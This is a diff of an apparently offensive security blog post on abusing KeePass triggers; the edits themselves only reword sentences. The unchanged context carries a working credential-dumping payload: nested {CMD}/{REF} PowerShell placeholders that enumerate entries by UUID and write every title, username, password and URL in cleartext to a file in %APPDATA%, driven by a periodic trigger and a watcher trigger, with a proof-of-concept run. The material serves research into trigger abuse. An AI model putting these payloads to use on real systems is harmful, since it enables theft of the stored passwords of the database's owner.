@@ -294,7 +294,7 @@ We can build a trigger that would Spr-compile and write the following placeholde
 ...                         ...                         ...
 ```
 
-The next step would be to add another level of recursion with `{REF:U@I:0 -{REF:U@I:0 -{REF:I@I:0}}}`, etc. I created a [dirty Python script](https://gist.github.com/d3lb3/fb6f5d82e47744f56117b350d94a6029) to generate recursive payloads.
+The next step would be to add another level of recursion with `{REF:U@I:0 -{REF:U@I:0 -{REF:I@I:0}}}` etc. I created a [dirty Python script](https://gist.github.com/d3lb3/fb6f5d82e47744f56117b350d94a6029) to generate recursive payloads.
 
 To increase the probability of matching the whole database, we can add a second character match like so:
 
@@ -420,7 +420,7 @@ To stop the loop, we can simply make a `{CMD}` placeholder return a string like 
 ![end_loop_example](/assets/img/blog/keepass_triggers/end_loop_example.png){: .shadow}
 _The trigger will be executed when the command return false_
 
-Once the stop condition is valid, the trigger is executed. Because actions where already performed in the condition through `{CMD}`, we no longer need any, and can immediately stop the trigger. For a trigger to be deleted right after it is executed, we can simply check *"Turn off after executing actions (run once)"* box in the trigger properties, or use the *"Change trigger on/off state"* action.
+Once the stop condition is valid, the trigger is executed. Because actions where already performed in the condition through `{CMD}`, we no longer need any, and can immediately stop the trigger. For a trigger to be disabled right after it is executed, we can simply check *"Turn off after executing actions (run once)"* box in the trigger properties, or use the *"Change trigger on/off state"* action.
 
 ## Putting it all together
 
@@ -436,7 +436,7 @@ The payload will be divided in two parts: one to successively resolve UUIDs thro
 
 ### Building the UUID list
 
-Remember, we are using the exclusion search method so we need to build a placeholder able to consecutively resolve each new UUID from the list of previous ones, then append it to the file. The first element of this placeholder will simply read UUIDs from `extract.csv`{: .filepath} and build the reference exclusion string from it.
+Remember, we are using the exclusion search method so we need to build a placeholder able to consecutively resolve each new UUID from the list of previous ones, then append it to a file. The first element of this placeholder will simply read UUIDs from `extract.csv`{: .filepath} and build the reference exclusion string.
 
 ```powershell
 $excluded_uuids='';
@@ -457,7 +457,7 @@ We put the snippet in a placeholder (with aliases and variable renames to make t
 {CMD:/PowerShell.exe -C "$eus='';if (!(Test-Path $env:APPDATA'\extract.csv')){ni -itemType File -Path $env:APPDATA -Name 'extract.csv' | Out-Null;};foreach($line in gc $env:APPDATA'\extract.csv'){$eus+=' -'+$line.Split(',')[0];}echo $eus;"/M=C,W:0,O:1,WS=H/}
 ```
 
-When successive UUIDs will be appended to `extract.csv`{: .filepath}, this placeholder should successively output:
+When successive lines will later be appended to `extract.csv`{: .filepath}, this placeholder should successively output:
 
 ```
 # first execution
@@ -472,7 +472,7 @@ When successive UUIDs will be appended to `extract.csv`{: .filepath}, this place
 # fourth loop..
 ```
 
-Once the exclusion string is built, we use it inside a field reference to resolve the next UUID and append it to `extact.csv`{: .filepath}:
+Once the exclusion string is built, we use it inside a field reference to resolve the next UUID before appending it to `extact.csv`{: .filepath}:
 
 ```powershell
 $new_uid='{REF:I@I:0{CMD:/PowerShell.exe -C "$eus='';if (!(Test-Path $env:APPDATA'\extract.csv')){ni -itemType File -Path $env:APPDATA -Name 'extract.csv' | Out-Null;};foreach($line in gc $env:APPDATA'\extract.csv'){$eus+=' -'+$line.Split(',')[0];}echo $eus;"/M=C,W:0,O:1,WS=H/}}';
@@ -493,20 +493,20 @@ if(!($uid.StartsWith('{REF'))){
 # third execution..
 ```
 
-Because this code will be executed inside a trigger condition, it needs to be inserted in a placeholder too:
+This code is meant to be executed inside a trigger condition, so it must be inserted in a placeholder first:
 
 ```
 {CMD:&PowerShell.exe -C "$uid='{REF:I@I:0{CMD:/PowerShell.exe -C "$eus='';if (!(Test-Path $env:APPDATA'\extract.csv')){ni -itemType File -Path $env:APPDATA -Name 'extract.csv' | Out-Null;};foreach($line in gc $env:APPDATA'\extract.csv'){$eus+=' -'+$line.Split(',')[0];}echo $eus;"/M=C,W:0,O:1,WS=H/}}';echo $uid;if(!($uid.StartsWith('{REF'))){ac -Path $env:APPDATA'\extract.csv' -Value $uid -NoNewline;}"&M=C,W:0,O:1,WS=H&}
 ```
 
-> Because we insert a {CMD} placeholder inside another one, a custom separator (here '&') must be defined.
+> Because we insert a {CMD} placeholder inside a {CMD}, a custom separator (here '&') must be defined.
 {: .prompt-tip }
 
 ### Resolving every entry
 
 Each time a new UUID is resolved, we use it to determine every entry of the corresponding field.
 
-Because we cannot store the UUID in a variable,  we need to get the UUID from file each time using `@(Get-Content -Path $env:APPDATA'\extract.csv')[-1]`. We insert it in a `{CMD}` placeholder, itself in a `{REF}`  (this time with exact match):
+Because we cannot store the UUID in a variable, we need to get the UUID from the file each time using `@(Get-Content -Path $env:APPDATA'\extract.csv')[-1]`. We insert this command in a `{CMD}` placeholder, itself in a `{REF}`. We have exact match on UUIDs now, so there is no need to use the exclusion search:
 
 ```powershell
 # resolve entries
@@ -524,7 +524,7 @@ if(!($title.StartsWith('{REF'))){
 }
 ```
 
-Same as before, we insert everything in a `{CMD}` placeholder for it to be executed inside a trigger's condition:
+Same as before, we insert everything in a `{CMD}` placeholder for it to be executed inside a trigger condition:
 
 ```
 {CMD:&PowerShell.exe -C "$title='{REF:T@I:{CMD:/PowerShell.exe -C "echo (gc -Path $env:APPDATA'\extract.csv')[-1];"/M=C,W:0,O:1,WS=H/}}';$user='{REF:U@I:{CMD:/PowerShell.exe -C "echo (gc -Path $env:APPDATA'\extract.csv')[-1];"/M=C,W:0,O:1,WS=H/}}';$password='{REF:P@I:{CMD:/PowerShell.exe -C "echo (gc -Path $env:APPDATA'\extract.csv')[-1];"/M=C,W:0,O:1,WS=H/}}';$url='{REF:A@I:{CMD:/PowerShell.exe -C "echo (gc -Path $env:APPDATA'\extract.csv')[-1];"/M=C,W:0,O:1,WS=H/}}';$output=','+$title+','+$user+','+$password+','+$url;echo $output;if(!($title.StartsWith('{REF'))){ac -Path $env:APPDATA'\extract.csv' -Value $output;}else{echo 'stop';}"&M=C,W:0,O:1,WS=H&}
@@ -538,11 +538,11 @@ As told before, we choose "Time - Periodic"  as the trigger event in order to lo
 
 ![extract_trigger_event](/assets/img/blog/keepass_triggers/extract_trigger_event.png){: .shadow}
 
-Both placeholders are inserted in the string value condition. Because it is checked on every event, the code will be executed every 4 seconds.
+Both placeholders are inserted in the string value condition. As it is checked on every event, the code will be executed every 4 seconds.
 
 ![extract_trigger_stop_condition](/assets/img/blog/keepass_triggers/extract_trigger_stop_condition.png){: .shadow}
 
-When the placeholders return *stop*, the trigger is launched. Everything was already executed, so we don't need any action and simple check "Turn off after executing actions (run once)" to make sure no more command is going to be executed:
+When the placeholders return *stop*, the trigger is launched. Everything was already executed, so we don't need any action and simply check _"Turn off after executing actions (run once)"_ to make sure no more command is going to be executed:
 
 ![extract_trigger_basic_parameters](/assets/img/blog/keepass_triggers/extract_trigger_basic_parameters.png){: .shadow}
 
@@ -552,7 +552,7 @@ Nothing in the configuration file keeps the on/off state of the trigger, so it w
 _Creation of a watcher trigger, executed before the extraction one_
 
 ![watcher_trigger_event](/assets/img/blog/keepass_triggers/watcher_trigger_event.png){: .shadow}
-_The trigger executed immediatly when KeePass is opened_
+_The trigger is executed immediatly when KeePass is opened_
 
 ![watcher_trigger_condition](/assets/img/blog/keepass_triggers/watcher_trigger_condition.png){: .shadow}
 _The trigger checks if an extract file already exists_
@@ -560,7 +560,7 @@ _The trigger checks if an extract file already exists_
 ![watcher_trigger_action](/assets/img/blog/keepass_triggers/watcher_trigger_action.png){: .shadow}
 _If the database was already extracted, disables the trigger._
 
-The complete payload will be:
+Our final payload will be:
 
 ```xml
 <Triggers>
@@ -623,7 +623,7 @@ The complete payload will be:
 
 ### PoC time!
 
-By launching KeePass against our sample database, we can observe that entries' UUIDS are populated in `%appdata%\extract.txt`{: .filepath}:
+Running it against our sample database, we can observe that entries' UUIDS are populated in `%appdata%\extract.txt`{: .filepath} 🥳
 
 ![extracted_entries](/assets/img/blog/keepass_triggers/extracted_entries.png){: .shadow}
 
